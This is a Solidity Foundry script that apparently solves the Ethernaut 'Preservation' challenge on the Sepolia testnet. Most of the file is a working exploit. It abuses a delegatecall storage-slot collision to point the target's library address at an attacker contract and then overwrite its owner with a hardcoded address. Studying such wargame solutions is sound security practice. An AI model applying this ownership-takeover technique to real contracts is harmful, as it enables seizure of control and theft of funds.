// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract takeOffOwnership is Script {
    hackPreservation hack;
    address contraPreservation = 0x7C2ddB73B7b1c601f2dBC085D6Ac3aD0F2fb42BC;

    function run() public {
        //steps
        // deploy the hack contract
        // call  "callDelegate" the first time : here you change the address of the contract that the delegate call aim
        // call "callDelegate2" : this will call our new contract that has another code excution that change the owner in the 4 slot
        vm.startBroadcast();
        hack = new hackPreservation();
        hack.callDelegate();
        hack.callDelegate2();
        (, bytes memory data) = contraPreservation.staticcall(
            abi.encodeWithSignature("owner()")
        );
        address newOwner = abi.decode(data, (address));
        console.log("the new owner is ", newOwner);
    }
}

//contract address in sepolia: 0x7C2ddB73B7b1c601f2dBC085D6Ac3aD0F2fb42BC
contract hackPreservation {
    // implement the same variables of the contract ;
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    address contra = 0x7C2ddB73B7b1c601f2dBC085D6Ac3aD0F2fb42BC;
    uint addressUint = uint256(uint160(address(this)));
    uint me = uint256(uint160(0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7));

    function setTime(uint time) public {
        // call the settimezone function by passing our address
        owner = address(uint160(uint(time)));
    }

    function callDelegate() public {
        // call the first time to change the library to this contract
        // call the second time to excute this code of the contract;
        (bool ok, ) = contra.call(
            abi.encodeWithSignature("setFirstTime(uint256)", addressUint)
        );
        require(ok, "tx failed");
    }

    function callDelegate2() public {
        // call the first time to change the library to this contract
        // call the second time to excute this code of the contract;
        (bool ok, ) = contra.call(
            abi.encodeWithSignature("setFirstTime(uint256)", me)
        );
        require(ok, "tx failed");
    }
}
